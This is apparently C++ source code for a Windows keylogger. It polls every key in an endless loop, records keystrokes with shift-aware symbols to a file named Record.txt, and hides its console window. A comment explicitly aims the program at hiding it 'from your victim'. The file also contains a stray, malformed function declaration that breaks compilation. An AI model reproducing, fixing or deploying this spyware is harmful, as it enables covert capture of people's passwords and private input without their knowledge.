#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
using namespace std;

void StealthMode();
void StartLogging();

int main()
{
    StealthMode();
    StartLogging();
    
    return 0;
}

void StartLogging()
{
        char c;
    
    for(;;)
	{
        
        for(c=8;c<=222;c++){ // ASCII values  8 for space  9 for tab and so on 
            if(GetAsyncKeyState(c)==-32767){     // if key is pressed  then make a text file named record
            
            ofstream write("Record.txt", ios::app);// (ios::app) All output operations are performed at the end of the file, appending the 
			                                        //content to the current content of the file
            
            if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )  // if c is in between A to Z and not equal to shift 
            {
                c+=32;
                write<<c;
                write.close();
                break;
            }
            else if((c>64)&&(c<91))
            {
                
                write<<c;
                write.close();
                break;
            }
            else {
                
                switch (c)
                {
                    case 48:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<")";
                        else
                            write<<"0";    
                        
                        
                        }   
                    break;
                    
                    
                    
                    case 49:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"!";
                        else
                            write<<"1";    
                        
                        
                        }   
                    break;
                    
                    case 50:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"@";
                        else
                            write<<"2";    
                        
                        }
                    break;
                    case 51:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"#";
                        else
                            write<<"3";    
                        
                        
                        }   
                    break;  
                    case 52:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"$";
                        else
                            write<<"4";    
                        
                        
                        }   
                    break;  
                    case 53:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"%";
                        else
                            write<<"5";    
                        
                        
                        }   
                    break;
                    case 54:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"^";
                        else
                            write<<"6";    
                        
                        
                        }   
                    break;
                    case 55:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"&";
                        else
                            write<<"7";    
                        
                        
                        }   
                    break;
                    case 56:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"*";
                        else
                            write<<"8";    
                        
                        
                        }   
                    break;
                    case 57:
                    {
                        if(GetAsyncKeyState(0x10))
                            
                            write<<"(";
                        else
                            write<<"9";    
                        
                        
                        }   
                    break;
                    
                    case VK_SPACE:   
                        write<<" ";
                        break;
                        
                    case VK_RETURN:  
                        write<<"\n";
                        break; 
						 
                    case VK_TAB:  
                        write<<"  ";
                        break;
                   case VK_BACK:
                        write<<"<BACKSPACE>";
                        break;
                        
                    case VK_DELETE:
                        write<<"<DELETE>";
                        break;
                        
                    case VK_CONTROL:
                    	write<<"<CONTROL>";
                    	break;
                    	
                    case VK_ESCAPE:
                    	write<<"<ESCAPE>";
                    	break;
                    	
                    case VK_END:
                    	write<<"<END>";
                    	break;
                    	
                    case VK_HOME:
                    	write<<"<HOME>";
                    	break;
                    	
                    case VK_NEXT:
                    	write<<"<PgDn>";
                    	break;
                    	
                    case VK_PRIOR:
                    	write<<"<PgUp>";
                    	break;
                    
                    case VK_RIGHT:
                    	write<<"<Right Arrow Key>";
                    	break;
                    	
                    case VK_LEFT:
                    	write<<"<Left Arrow Key>";
                    	break;
                    
                    case VK_DOWN:
                    	write<<"<Down Arrow Key>";
                    	break;
                    	
                    case VK_UP:
                    	write<<"<Up Arrow Key>";
                    	break;
                    	
                    case VK_INSERT:
                    	write<<"<Insert>";
                    	break;
                    	
                    case VK_SNAPSHOT:
                    	write<<"<PtrScr>";
                    	break;
                    
                    default:
                        write<<c; 
            }
                
                }
           
           }
        }
    }
}

// This part of the code will help you hide your keylogger from your victim and keep the program window hidden.

void Stealth()  // //Detaches itself from the Console and runs hidden

void StealthMode(){
    HWND stealth; // declare a window handle 
    AllocConsole(); // it will allocate a new console for calling process
    stealth=FindWindowA("ConsoleWindowClass",NULL); // it will find the window handle with class name ConsoleWindowClass
    ShowWindow(stealth,0); // it will hide it
}
